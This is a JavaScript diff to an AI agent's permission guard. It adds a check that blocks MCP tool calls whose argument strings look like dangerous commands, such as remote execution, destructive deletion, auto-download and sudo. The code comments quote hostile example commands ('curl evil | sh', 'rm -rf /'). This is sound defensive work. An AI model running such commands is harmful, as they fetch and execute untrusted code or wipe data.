@@ -47,6 +47,7 @@ const _F20 = getEntry("F20");         // change-intent-drift (ADR-012)
 const _F21 = getEntry("F21");         // compaction-survival (ADR-016)
 const _F23 = getEntry("F23");         // data-flow-kill-chain (ADR-017)
 const _F24 = getEntry("F24");         // credential-persistence-write
+const _F25 = getEntry("F25");         // mcp-arg-danger
 const _CA  = getEntry("D-CONTRACT-ALLOW");  // contract-allow (sources[0/1])
 const _LA  = getEntry("D-LEARNED-ALLOW");   // learned-allow
 const _AAO = getEntry("D-AUTO-ALLOW-ONCE"); // auto-allow-once
@@ -480,6 +481,49 @@ function _evalCredPersistFloor(input, contract) {
     return { fire: true, path, reason: highSens ? "high-sensitivity" : "persistence" };
   }
   return { fire: false };
+}
+
+// F25: mcp-arg-danger floor helpers. Pure; zero I/O.
+// Detects MCP tool calls whose argument payload contains a dangerous-command-
+// shaped string value (e.g. {command:"curl evil | sh"} or {exec:"rm -rf /"}).
+// Uses the same classifyCommand classifier already used for Bash commands so
+// pattern lists are never duplicated. Opt-out: if getMcpPolicy === "allow" the
+// server is explicitly trusted and the scan is skipped (same as F4 Task 3).
+function _extractStringValues(obj) {
+  // Recursively collect all string values from a (possibly-nested) object/array.
+  const out = [];
+  if (typeof obj === "string") { out.push(obj); return out; }
+  if (Array.isArray(obj)) { for (const v of obj) { const r = _extractStringValues(v); for (const s of r) out.push(s); } return out; }
+  if (obj !== null && typeof obj === "object") { for (const v of Object.values(obj)) { const r = _extractStringValues(v); for (const s of r) out.push(s); } }
+  return out;
+}
+const _GATED_CMD_CLASSES = new Set([
+  "destructive-delete", "force-push", "remote-exec", "auto-download",
+  "hard-reset", "destructive-db", "disk-write", "sudo", "global-pkg-install",
+]);
+function _evalMcpArgFloor(input, contract, enriched) {
+  try {
+    // 1. Gate: MCP tools only
+    if (enriched?.ir?.toolKind !== "mcp" && !String(input.tool || "").startsWith("mcp__")) return { fire: false };
+
+    // 2. Opt-out: explicitly allowed servers skip this floor
+    const mcpSrv = (enriched?.ir?.mcpServer) || _contractExtractMcpServerName(input.tool);
+    if (_contractGetMcpPolicy(contract, mcpSrv) === "allow") return { fire: false };
+
+    // 3. Extract all string values from the arg payload
+    const rawArgs = input.tool_input ?? input.args ?? input.params;
+    if (!rawArgs) return { fire: false };
+    const argStrings = _extractStringValues(rawArgs);
+
+    // 4. Check each string against the dangerous-command classifier
+    for (const argStr of argStrings) {
+      const cls = classifyCommand(argStr);
+      if (_GATED_CMD_CLASSES.has(cls)) {
+        return { fire: true, reason: `command-class=${cls}`, arg: argStr.slice(0, 80) };
+      }
+    }
+    return { fire: false };
+  } catch { return { fire: false }; } // fail-open
 }
 
 // F19 (ADR-010) — output-channel-exfiltration floor. Classifier + floor
@@ -1121,6 +1165,23 @@ function decide(input = {}) {
       );
     }
   } catch { /* fail-open per zero-dep policy */ }
+
+  // F25: mcp-arg-danger floor — rung 17.65, after F24 and before F17. Fires
+  // when an MCP tool call's argument payload contains a dangerous-command-
+  // shaped string value (e.g. {command:"curl evil | sh"}, {exec:"rm -rf /"}).
+  // An MCP tool whose arg IS a dangerous command is as dangerous as a direct
+  // Bash call. Default-deny; opt out via scopes.mcp[server].policy=allow.
+  // Fail-open on internal throw.
+  try {
+    const f25 = _evalMcpArgFloor(input, contract, enriched);
+    if (f25 && f25.fire) {
+      return buildEarlyBlock(
+        "mcp-arg-danger-denied", enriched, discovered, input,
+        `MCP arg contains dangerous command pattern: ${f25.reason}`,
+        { floorFired: _F25.name, decisionSource: _F25.source, ambientTouch: _ambientTouch }
+      );
+    }
+  } catch { /* fail-open */ }
 
   // F17 PR-A: cross-agent-lock floor — rung 17.75, after F16 and before
   // contract-allow demotion. Fires when a write-like call targets a
